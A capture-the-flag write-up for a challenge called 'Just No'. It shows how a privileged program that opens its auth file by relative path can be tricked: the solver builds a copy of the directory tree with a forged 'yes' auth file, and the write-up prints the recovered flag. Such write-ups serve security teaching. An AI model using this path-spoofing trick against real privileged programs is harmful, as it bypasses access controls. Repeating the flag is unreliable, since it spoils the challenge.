##Just No
**A program at /problems/ec9da1496f80c8248197ba564097cebb has access to a flag but refuses to share it. Can you convince it otherwise?**

>Hints:
>
>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

First of all, navigate to the problem directory. Here we have four files:

- auth
- flag
- justno
- justno.c

We cannot access the flag file at all, we can read auth and justno.c and execute justno. Executing just no gives us:

```
auth file says no. So no. Just... no.
```

Auth file is blocking us. Lets see what it says:

`cat auth` gives us `no`.

Since we cannot modify the auth file, we can take a look at the justno.c:

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){ 
  //access auth file in ../../../problems/ec9da...7cebb
  FILE* authf = fopen("../../problems/ec9da...7cebb/auth","r");
  if(authf == NULL){
    printf("could not find auth file in ../../problems/ec9da...7cebb/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/ec9da...7cebb/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... " + 
    	"Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
```

Looking at the source code, we can see that the auth and flag files are accessed in different ways despite being located in the same directory. Th auth file is accessed using a relative path. This means we can spoof it provided we provide a similar directory structure.

Since we need to make our own auth file, we work from our home directory. Here we make two directories: problems and ec9da1496f80c8248197ba564097cebb to mimic the same structure expected in the justno executable.

```bash
mkdir problems
cd problems
mkdir ec9da1496f80c8248197ba564097cebb
cd ec9da1496f80c8248197ba564097cebb
```
Inside ec9da1496f80c8248197ba564097cebb directory we create our own auth file:

```bash
echo "yes" > auth
```

Next we run the justno executable from  our copy of the ec9da1496f80c8248197ba564097cebb directory. We can do this by:

```bash
#run justno located in the original ec9da1496f80c8248197ba564097cebb dir
/problems/ec9da1496f80c8248197ba564097cebb/justno
```

Doing so gives us the flag:

```
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 
e4cec8fdf76a931b03ad7ef026103d43
```
